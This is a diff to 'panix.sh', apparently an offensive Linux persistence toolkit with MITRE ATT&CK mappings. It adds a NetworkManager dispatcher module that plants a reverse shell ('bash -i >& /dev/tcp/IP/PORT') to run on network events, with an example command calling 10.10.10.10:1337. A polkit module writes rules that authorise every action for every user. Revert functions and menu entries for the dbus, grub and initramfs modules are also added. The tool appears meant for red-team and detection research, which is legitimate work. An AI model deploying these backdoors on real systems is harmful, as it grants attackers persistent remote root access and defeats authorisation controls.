+		echo "Warning: Neither dracut nor update-initramfs is installed. Skipping initramfs rebuild."
+	fi
+
+	# 4. Clean up temporary files (if applicable)
+	local tmp_dir="/tmp/initramfs*"
+	echo "[!] Cleaning up temporary files..."
+	rm -rf $tmp_dir
+	if [[ $? -ne 0 ]]; then
+		echo "Error: Failed to clean up temporary files."
+		return 1
+	fi
+	echo "[+] Temporary files cleaned up."
+
+	echo "[+] Initramfs persistence reverted successfully."
 	return 0
 }
 
@@ -3421,6 +4313,266 @@ revert_motd() {
 	return 0
 }
 
+# Module: setup_network_manager.sh
+setup_network_manager() {
+	local default=0
+	local custom=0
+	local ip=""
+	local port=""
+	local payload=""
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_network_manager() {
+		echo "Usage: ./panix.sh --network-manager [OPTIONS]"
+		echo "--examples                   Display command examples"
+		echo "--default                    Use default NetworkManager settings"
+		echo "  --ip <ip>                    Specify IP address"
+		echo "  --port <port>                Specify port number"
+		echo "--custom                     Use custom NetworkManager settings"
+		echo "  --payload <payload>          Specify custom payload"
+		echo "--help|-h                    Show this help message"
+	}
+
+	# Process options so that we know what payload to use
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--default )
+				default=1
+				;;
+			--custom )
+				custom=1
+				;;
+			--ip )
+				shift
+				ip=$1
+				;;
+			--port )
+				shift
+				port=$1
+				;;
+			--payload )
+				shift
+				payload=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "sudo ./panix.sh --network-manager --default --ip 10.10.10.10 --port 1337"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./panix.sh --network-manager --custom --payload 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'"
+				exit 0
+				;;
+			--help|-h)
+				usage_network_manager
+				exit 0
+				;;
+			* )
+				echo "Invalid option for --network-manager: $1"
+				echo "Try './panix.sh --network-manager --help' for more information."
+				exit 1
+		esac
+		shift
+	done
+
+	if [[ $default -eq 1 && $custom -eq 1 ]]; then
+		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './panix.sh --network-manager --help' for more information."
+		exit 1
+	fi
+
+	if [[ $default -eq 0 && $custom -eq 0 ]]; then
+		echo "Error: Either --default or --custom must be specified."
+		echo "Try './panix.sh --network-manager --help' for more information."
+		exit 1
+	fi
+
+	if [[ $default -eq 1 ]]; then
+		if [[ -z $ip || -z $port ]]; then
+			echo "Error: --ip and --port must be specified when using --default."
+			echo "Try './panix.sh --network-manager --help' for more information."
+			exit 1
+		fi
+		payload="nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' & disown"
+	fi
+
+	if [[ $custom -eq 1 ]]; then
+		if [[ -z $payload ]]; then
+			echo "Error: --payload must be specified when using --custom."
+			echo "Try './panix.sh --network-manager --help' for more information."
+			exit 1
+		fi
+	fi
+
+	if ! command -v NetworkManager &>/dev/null; then
+		echo "Error: NetworkManager is not installed or not in PATH."
+		echo "You can install it with:"
+		echo "sudo apt install network-manager"
+		echo "sudo dnf/yum install NetworkManager"
+		echo "sudo pacman -S networkmanager"
+		echo ""
+		echo "[!] Warning: If the package requires installation, the technique might not work out of the box, as NetworkManager might not be used by default!"
+		exit 1
+	fi
+
+	if [[ ! -d /etc/NetworkManager/dispatcher.d/ ]]; then
+		echo "Error: /etc/NetworkManager/dispatcher.d/ does not exist. NetworkManager is not configured."
+		exit 1
+	fi
+
+	local dispatcher_file="/etc/NetworkManager/dispatcher.d/panix-dispatcher.sh"
+
+	# Create the dispatcher file if it does not exist,
+	# using a quoted heredoc to prevent variable expansion.
+	if [[ ! -f $dispatcher_file ]]; then
+		cat <<'EOF' > "$dispatcher_file"
+#!/bin/sh -e
+
+if [ "$2" = "connectivity-change" ]; then
+	exit 0
+fi
+
+if [ -z "$1" ]; then
+	echo "$0: called with no interface" 1>&2
+	exit 1
+fi
+
+if [ -n "$IP4_NUM_ADDRESSES" ] && [ "$IP4_NUM_ADDRESSES" -gt 0 ]; then
+	ADDRESS_FAMILIES="$ADDRESS_FAMILIES inet"
+fi
+if [ -n "$IP6_NUM_ADDRESSES" ] && [ "$IP6_NUM_ADDRESSES" -gt 0 ]; then
+	ADDRESS_FAMILIES="$ADDRESS_FAMILIES inet6"
+fi
+
+# If we have a VPN connection ignore the underlying IP address(es)
+if [ "$2" = "vpn-up" ] || [ "$2" = "vpn-down" ]; then
+	ADDRESS_FAMILIES=""
+fi
+
+if [ -n "$VPN_IP4_NUM_ADDRESSES" ] && [ "$VPN_IP4_NUM_ADDRESSES" -gt 0 ]; then
+	ADDRESS_FAMILIES="$ADDRESS_FAMILIES inet"
+fi
+if [ -n "$VPN_IP6_NUM_ADDRESSES" ] && [ "$VPN_IP6_NUM_ADDRESSES" -gt 0 ]; then
+	ADDRESS_FAMILIES="$ADDRESS_FAMILIES inet6"
+fi
+
+# We're probably bringing the interface down.
+[ -n "$ADDRESS_FAMILIES" ] || ADDRESS_FAMILIES="inet"
+
+# Fake ifupdown environment
+export IFACE="$1"
+export LOGICAL="$1"
+export METHOD="NetworkManager"
+export VERBOSITY="0"
+
+for i in $ADDRESS_FAMILIES; do
+	export ADDRFAM="$i"
+
+	# Run the right scripts
+	case "$2" in
+		up|vpn-up)
+			export MODE="start"
+			export PHASE="post-up"
+			run-parts /etc/network/if-up.d
+			;;
+		down|vpn-down)
+			export MODE="stop"
+			export PHASE="post-down"
+			run-parts /etc/network/if-post-down.d
+			;;
+		hostname|dhcp4-change|dhcp6-change)
+			# Do nothing
+			;;
+		*)
+			echo "$0: called with unknown action \`$2'" 1>&2
+			exit 1
+			;;
+	esac
+done
+
+# Insert payload here:
+__PAYLOAD_PLACEHOLDER__
+EOF
+
+		chmod +x "$dispatcher_file"
+		echo "[+] Created new dispatcher file: $dispatcher_file"
+	fi
+
+	# Replace the placeholder with the actual payload if present.
+	if grep -q "__PAYLOAD_PLACEHOLDER__" "$dispatcher_file"; then
+		# Escape the payload for use in sed
+		local escaped_payload
+		escaped_payload=$(printf '%s\n' "$payload" | sed 's/[\/&]/\\&/g')
+		sed -i "s/__PAYLOAD_PLACEHOLDER__/$escaped_payload/" "$dispatcher_file"
+		echo "[+] Replaced payload placeholder with actual payload."
+	else
+		# If the file already exists and no placeholder is found,
+		# check if the payload is already present.
+		if grep -qF "$payload" "$dispatcher_file"; then
+			echo "[+] Payload already exists in $dispatcher_file."
+		else
+			echo "[+] Adding payload to $dispatcher_file..."
+			echo "$payload" >> "$dispatcher_file"
+			chmod +x "$dispatcher_file"
+			echo "[+] Payload added successfully."
+		fi
+	fi
+
+	echo "[+] Using dispatcher file: $dispatcher_file"
+}
+
+# Revert Module: revert_network_manager.sh
+revert_network_manager() {
+	usage_revert_network_manager() {
+		echo "Usage: ./panix.sh --revert network-manager"
+		echo "Reverts any changes made by the setup_network-manager module."
+	}
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	local dispatcher_file="/etc/NetworkManager/dispatcher.d/01-ifupdown"
+	local custom_file="/etc/NetworkManager/dispatcher.d/panix-dispatcher.sh"
+
+	# Function to remove payload from dispatcher file
+	remove_payload() {
+		local file="$1"
+		if [[ -f "$file" ]]; then
+			echo "[+] Checking for payload in $file..."
+
+			if ! grep -q "bash -i >& " "$file" && ! grep -q "nohup setsid bash -c" "$file"; then
+				echo "[+] No payload found in $file."
+			else
+				echo "[!] Payload found in $file. Removing..."
+				sed -i '/bash -i >& /d' "$file"
+				sed -i '/nohup setsid bash -c/d' "$file"
+				echo "[+] Payload removed from $file."
+			fi
+		else
+			echo "[-] File not found: $file"
+		fi
+	}
+
+	# Remove payload from dispatcher files
+	if [[ -f "$dispatcher_file" ]]; then
+		remove_payload "$dispatcher_file"
+	fi
+
+	if [[ -f "$custom_file" ]]; then
+		echo "[+] Removing custom dispatcher file: $custom_file..."
+		rm -f "$custom_file"
+		echo "[+] Custom dispatcher file removed."
+	fi
+
+	echo "[+] NetworkManager persistence reverted."
+	return 0
+}
+
 # Module: setup_package_manager_persistence.sh
 setup_package_manager_persistence() {
 	local ip=""
@@ -4445,6 +5597,159 @@ revert_password_change() {
 		echo "Usage: ./panix.sh --revert password-change"
 		echo "Reverts any changes made by the setup_password_change module."
 	}
+}
+
+# Module: setup_polkit.sh
+setup_polkit() {
+	local polkit_version=""
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_polkit() {
+		echo "Usage: sudo ./panix.sh --polkit"
+		echo "--examples            Display command examples"
+		echo "--help|-h             Show this help message"
+	}
+
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--examples )
+				echo "Example:"
+				echo "sudo ./panix.sh --polkit"
+				exit 0
+				;;
+			--help | -h )
+				usage_polkit
+				exit 0
+				;;
+			* )
+				echo "Invalid option: $1"
+				echo "Try 'sudo ./panix.sh --polkit --help' for more information."
+				exit 1
+				;;
+		esac
+		shift
+	done
+
+	# Ensure bc is installed for version comparison.
+	if ! command -v bc &>/dev/null; then
+		echo "Error: bc is required for version comparison. Please install bc (e.g., sudo apt install bc or sudo yum install bc)."
+		exit 1
+	fi
+
+	# Check polkit version.
+	if command -v pkaction &>/dev/null; then
+		# Modified regex to match integer versions or dotted versions.
+		polkit_version=$(pkaction --version | grep -oE '[0-9]+(\.[0-9]+){0,2}')
+	else
+		echo "[-] Error: Polkit is not installed."
+		exit 1
+	fi
+
+	if [[ -z $polkit_version ]]; then
+		echo "[-] Error: Unable to determine polkit version."
+		exit 1
+	fi
+
+	# Compare version. For versions output as integers (like "124") this will treat them as greater than 0.106.
+	if [[ $(echo "$polkit_version < 0.106" | bc -l) -eq 1 ]]; then
+		echo "[!] Polkit version < 0.106 detected. Setting up persistence using .pkla files."
+
+		# Ensure directory structure exists.
+		mkdir -p /etc/polkit-1/localauthority/50-local.d/
+
+		# Write the .pkla file.
+		cat <<-EOF > /etc/polkit-1/localauthority/50-local.d/panix.pkla
+		[Allow Everything]
+		Identity=unix-user:*
+		Action=*
+		ResultAny=yes
+		ResultInactive=yes
+		ResultActive=yes
+		EOF
+
+		echo "[+] Persistence established via .pkla file."
+	else
+		echo "[!] Polkit version >= 0.106 detected. Setting up persistence using .rules files."
+
+		# Ensure directory structure exists.
+		mkdir -p /etc/polkit-1/rules.d/
+
+		# Write the .rules file.
+		cat <<-EOF > /etc/polkit-1/rules.d/99-panix.rules
+		polkit.addRule(function(action, subject) {
+			return polkit.Result.YES;
+		});
+		EOF
+
+		echo "[+] Persistence established via .rules file."
+	fi
+
+	# Restart polkit.
+	if systemctl restart polkit; then
+		echo "[+] Polkit service restarted."
+	else
+		echo "[-] Failed to restart polkit service."
+		exit 1
+	fi
+
+	echo "[!] Run pkexec su - to test the persistence."
+}
+
+# Revert Module: revert_polkit.sh
+revert_polkit() {
+    usage_revert_polkit() {
+        echo "Usage: ./panix.sh --revert polkit"
+        echo "Reverts any changes made by the setup_polkit module."
+    }
+
+    # Ensure the function is run as root
+    if ! check_root; then
+        echo "Error: This function can only be run as root."
+        return 1
+    fi
+
+    # Function to remove a file if it exists
+    remove_file() {
+        local file_path="$1"
+        if [[ -f "$file_path" ]]; then
+            rm -f "$file_path"
+            echo "[+] Removed file: $file_path"
+        else
+            echo "[-] File not found: $file_path"
+        fi
+    }
+
+    # Remove .pkla persistence file
+    pkla_path="/etc/polkit-1/localauthority/50-local.d/panix.pkla"
+    echo "[+] Checking for .pkla persistence file..."
+    if [[ -f "$pkla_path" ]]; then
+        remove_file "$pkla_path"
+    else
+        echo "[-] .pkla file not found: $pkla_path"
+    fi
+
+    # Remove .rules persistence file
+    rules_path="/etc/polkit-1/rules.d/99-panix.rules"
+    echo "[+] Checking for .rules persistence file..."
+    if [[ -f "$rules_path" ]]; then
+        remove_file "$rules_path"
+    else
+        echo "[-] .rules file not found: $rules_path"
+    fi
+
+    # Restart polkit service to apply changes
+    echo "[+] Restarting polkit service..."
+    if systemctl restart polkit; then
+        echo "[+] Polkit service restarted successfully."
+    else
+        echo "[-] Failed to restart polkit service."
+    fi
+
+    return 0
 }
 
 # Module: setup_rc_local_backdoor.sh
@@ -7799,18 +9104,23 @@ display_mitre_matrix() {
 		"--cap" "Abuse Elevation Control Mechanism" "T1548" "N/A" "N/A" "https://attack.mitre.org/techniques/T1548" \
 		"--create-user" "Create Account" "T1136" "Local Account" "T1136.001" "https://attack.mitre.org/techniques/T1136/001" \
 		"--cron" "Scheduled Task" "T1053" "Cron" "T1053.003" "https://attack.mitre.org/techniques/T1053/003" \
+		"--dbus" "Create or Modify System Process" "T1543" "N/A" "N/A" "https://attack.mitre.org/techniques/T1543" \
 		"--generator" "Create or Modify System Process" "T1543" "Systemd Service" "T1543.002" "https://attack.mitre.org/techniques/T1543/002" \
 		"--git" "Event Triggered Execution" "T1546" "N/A" "N/A" "https://attack.mitre.org/techniques/T1546" \
+		"--grub" "Pre-OS Boot" "T1542" "N/A" "N/A" "https://attack.mitre.org/techniques/T1542" \
 		"--initd" "Boot or Logon Initialization Scripts" "T1037" "N/A" "N/A" "https://attack.mitre.org/techniques/T1037" \
+		"--initramfs" "Pre-OS Boot" "T1542" "N/A" "N/A" "https://attack.mitre.org/techniques/T1542" \
 		"--ld-preload" "Hijack Execution Flow" "T1574" "Dynamic Linker Hijacking" "T1574.006" "https://attack.mitre.org/techniques/T1574/006" \
 		"--lkm" "Boot or Logon Autostart Execution" "T1547" "Kernel Modules and Extensions" "T1547.006" "https://attack.mitre.org/techniques/T1547/006" \
 		"--malicious-container" "Escape to Host" "T1610" "N/A" "N/A" "https://attack.mitre.org/techniques/T1610" \
 		"--malicious-package" "Event Triggered Execution" "T1546" "Installer Packages" "T1546.016" "https://attack.mitre.org/techniques/T1546/016" \
 		"--motd" "Boot or Logon Initialization Scripts" "T1037" "N/A" "N/A" "https://attack.mitre.org/techniques/T1037" \
+		"--network-manager" "Event Triggered Execution" "T1546" "N/A" "N/A" "https://attack.mitre.org/techniques/T1546" \
 		"--package-manager" "Event Triggered Execution" "T1546" "Installer Packages" "T1546.016" "https://attack.mitre.org/techniques/T1546/016" \
 		"--pam" "Modify Authentication Process" "T1556" "Pluggable Authentication Modules" "T1556.003" "https://attack.mitre.org/techniques/T1556/003" \
 		"--passwd-user" "Account Manipulation" "T1098" "N/A" "N/A" "https://attack.mitre.org/techniques/T1098" \
 		"--password-change" "Account Manipulation" "T1098" "N/A" "N/A" "https://attack.mitre.org/techniques/T1098" \
+		"--polkit" "Modify Authentication Process" "T1556" "N/A" "N/A" "https://attack.mitre.org/techniques/T1556/" \
 		"--rc-local" "Boot or Logon Initialization Scripts" "T1037" "RC Scripts" "T1037.004" "https://attack.mitre.org/techniques/T1037/004" \
 		"--reverse-shell" "Command and Scripting Interpreter" "T1059" "Unix Shell" "T1059.004" "https://attack.mitre.org/techniques/T1059/004" \
 		"--rootkit" "Rootkit" "T1014" "N/A" "N/A" "https://attack.mitre.org/techniques/T1014" \
@@ -7916,6 +9226,11 @@ main() {
 				setup_cron "$@"
 				exit
 				;;
+			--dbus )
+				shift
+				setup_dbus "$@"
+				exit
+				;;
 			--generator )
 				shift
 				setup_generator_persistence "$@"
@@ -7926,9 +9241,19 @@ main() {
 				setup_git_persistence "$@"
 				exit
 				;;
+			--grub )
+				shift
+				setup_grub "$@"
+				exit
+				;;
 			--initd )
 				shift
 				setup_initd_backdoor "$@"
+				exit
+				;;
+			--initramfs )
+				shift
+				setup_initramfs "$@"
 				exit
 				;;
 			--ld-preload )
@@ -7956,6 +9281,11 @@ main() {
 				setup_motd_backdoor "$@"
 				exit
 				;;
+			--network-manager )
+				shift
+				setup_network_manager "$@"
+				exit
+				;;
 			--package-manager )
 				shift
 				setup_package_manager_persistence "$@"
@@ -7974,6 +9304,11 @@ main() {
 			--password-change )
 				shift
 				setup_password_change "$@"
+				exit
+				;;
+			--polkit )
+				shift
+				setup_polkit "$@"
 				exit
 				;;
 			--rc-local )
@@ -8062,7 +9397,7 @@ main() {
 
 				if type "$MODULE_NAME" &>/dev/null; then
 					echo ""
-					echo "######################### [+] Reverting $1 module... #########################"
+					echo "################## [+] Reverting $1 module... "##################
 					echo ""
 					$MODULE_NAME  # Execute the function
 				else
